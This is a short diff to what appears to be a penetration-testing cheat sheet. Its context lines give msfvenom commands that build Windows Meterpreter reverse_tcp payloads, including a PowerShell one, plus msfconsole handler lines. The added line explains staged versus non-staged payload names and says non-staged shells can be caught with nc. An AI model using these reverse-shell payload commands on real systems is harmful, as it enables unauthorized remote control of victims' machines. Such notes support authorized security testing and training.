@@ -42,6 +42,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$TARGET_IP$ LPORT=4444 -f psh -o meterpreter-64.ps1
 ```
 
+the forward slash indicates that is a "staged" payload, the one with the underscore means it’s non-staged and can be handled by program like nc
+
 ```msfconsole
 use windows/x64/meterpreter/reverse_tcp
 use windows/meterpreter/reverse_tcp
